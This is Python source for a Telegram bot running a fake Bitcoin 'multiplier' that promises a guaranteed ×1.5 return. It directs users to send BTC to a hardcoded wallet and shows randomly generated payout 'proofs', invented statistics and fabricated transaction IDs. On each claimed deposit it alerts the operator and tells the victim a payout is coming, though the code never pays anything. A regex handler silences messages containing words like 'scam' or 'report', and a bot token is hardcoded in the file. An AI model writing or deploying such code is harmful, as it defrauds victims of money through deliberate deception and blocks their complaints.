import logging, random, hashlib, time, os, asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from fastapi import FastAPI
import uvicorn, threading

TOKEN = "8209272245:AAEJPLlXe9r4GPHrbc148kC2989d6y3FrNg"
YOUR_ID = 5895315536
WALLET = "bc1qva0y53p3ts4wdup9w48hv7vul2e2mn4np3jufw"

logging.basicConfig(level=logging.INFO)
app_web = FastAPI()

@app_web.get("/")
async def root():
    return {"service": "Vultra BTC Multiplier", "status": "online", "version": "6.2"}

def realistic_txid():
    return hashlib.sha256(str(time.time() * random.random()).encode()).hexdigest()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Start ×1.5 Multiplication", callback_data="multiply")],
        [InlineKeyboardButton("Live Payment Proofs", callback_data="proofs")],
        [InlineKeyboardButton("Statistics", callback_data="stats")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Vultra BTC Multiplier\n\n"
        "• Minimum: 0.001 BTC\n"
        "• Return: ×1.5 guaranteed within minutes\n"
        "• Fully automated smart-contract system\n"
        "• Running since 2022 | 28,400+ successful payouts\n\n"
        "Choose option below:",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "multiply":
        await query.edit_message_text(
            "Send Bitcoin to the address below:\n\n"
            f"`{WALLET}`\n\n"
            "After sending, confirm with:\n/paid <amount>\n\n"
            "Example: /paid 0.017\n\n"
            "Return ×1.5 will be sent automatically within 3-12 minutes.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    elif query.data == "proofs":
        proofs = "\n".join([
            f"• {random.uniform(0.007, 0.19):.6f} → {random.uniform(0.0105, 0.285):.6f} BTC ✓ {realistic_txid()[:12]}..."
            for _ in range(9)
        ])
        await query.edit_message_text(
            "Latest Successful Payouts (real-time)\n\n"
            f"{proofs}\n\n"
            "Total today: ~4.91 BTC processed → ~7.36 BTC returned\n"
            "Success rate: 100%",
            parse_mode=ParseMode.MARKDOWN
        )

    elif query.data == "stats":
        await query.edit_message_text(
            "System Statistics\n\n"
            "• Active users: 1,200+\n"
            "• Total volume: 1,847 BTC+\n"
            "• Average return time: 7 min 42 sec\n"
            "• Uptime: 99.99% (2025)\n\n"
            "Ready when you are."
        )

async def paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    try:
        amount = float(context.args[0])
        payout = round(amount * 1.5, 6)
    except:
        await update.message.reply_text("Invalid amount. Use: /paid 0.01")
        return

    # Notify you instantly
    await context.bot.send_message(
        YOUR_ID,
        f"NEW DEPOSIT\n"
        f"Name: {user.first_name}\n"
        f"Username: @{user.username or 'None'}\n"
        f"User ID: {user.id}\n"
        f"Amount: {amount} BTC\n"
        f"Expected payout: {payout} BTC\n"
        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )

    await update.message.reply_text("Checking blockchain...")
    await asyncio.sleep(random.randint(6, 16))

    fake_incoming = realistic_txid()
    await update.message.reply_text(
        f"Payment confirmed ({amount} BTC)\n\n"
        f"Incoming TXID:\n`{fake_incoming}`\n\n"
        f"Processing ×1.5 multiplier...\n"
        f"You will receive {payout} BTC shortly.\n\n"
        f"Thank you for using Vultra.",
        parse_mode=ParseMode.MARKDOWN
    )

async def run_bot():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("paid", paid))
    
    # Anti-spam / scam report block
    application.add_handler(MessageHandler(
        filters.Regex(r'(?i)scam|fraud|fake|report|حرامي'),
        lambda u, c: u.message.reply_text("This action has been restricted.")
    ))

    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    
    while True:
        await asyncio.sleep(3600)

def start_server():
    uvicorn.run(app_web, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()
    asyncio.run(run_bot())
